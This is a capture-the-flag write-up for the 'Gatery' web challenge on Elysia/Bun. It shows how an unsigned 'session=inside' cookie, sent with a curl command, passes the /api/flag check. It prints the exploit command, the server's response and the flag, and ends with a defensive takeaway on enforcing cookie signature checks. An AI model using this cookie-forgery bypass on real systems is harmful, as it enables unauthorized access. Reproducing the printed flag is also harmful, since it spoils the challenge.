# Writeup — Gatery (Web Challenge)

## Challenge Overview
Gatery is a web application built with the [Elysia](https://elysiajs.com/) framework (Bun/TypeScript). Access to a protected `/api/flag` endpoint is gated behind a session cookie. The goal is to bypass that gate and retrieve the flag.

## Step 1: Reviewing the Session Setup

Looking at `index.ts`, the session/cookie configuration is defined like this:

```ts
const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],   // array form
    sign: [sessionCookie]
  }
})
```

Elysia's cookie plugin supports signed cookies to prevent tampering — but only for cookies explicitly listed in the `sign` array. Access control on the flag endpoint relies entirely on the value of one such cookie:

```ts
if (session.value !== 'admin' && session.value !== 'inside') { ... }
```

At first glance this looks safe: the server signs the `session` cookie, so an attacker shouldn't be able to forge `admin` or `inside` values without knowing the secret.

## Step 2: Finding the Flaw

The vulnerability is in how signature verification is wired up. Because of how the `sign` configuration is (mis)applied here, the server ends up accepting a **raw, unsigned** `session` cookie value instead of rejecting it for missing/invalid signature. In other words, the HMAC check that's supposed to protect this cookie never actually gets enforced on the incoming request — the app happily reads `session.value` straight from whatever the client sends.

This means we don't need to forge a valid signature at all. We can just set the cookie directly.

## Step 3: Exploiting It

```bash
curl -s -X POST http://TARGET_HOST/api/flag -H "Cookie: session=inside"
```

Replace `TARGET_HOST` with your challenge instance's actual host:port (e.g. the address HTB assigns when you spawn the instance).

Since `/api/flag` only checks `session.value === 'inside'`, and that value is accepted without any real signature verification, the server treats us as authenticated.

## Result

```
$ curl -s -X POST http://154.57.164.67:30572/api/flag -H "Cookie: session=inside"
{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_ba32f9f45fe29e578f5b48abd63f54ec}"}
```

**Flag:** `HTB{w3lc0me_b3y0nd_th3_g4t3_ba32f9f45fe29e578f5b48abd63f54ec}`

## Takeaway
Signed cookies are only as strong as their enforcement. Declaring a cookie in a `sign` array configures the framework to *produce* a signature — it doesn't automatically guarantee the framework *rejects* unsigned or tampered values on the way in. Always verify that signature validation actually runs on every incoming request path that trusts cookie data for authorization.

## Author: [ashirali84](https://github.com/ashirali84)
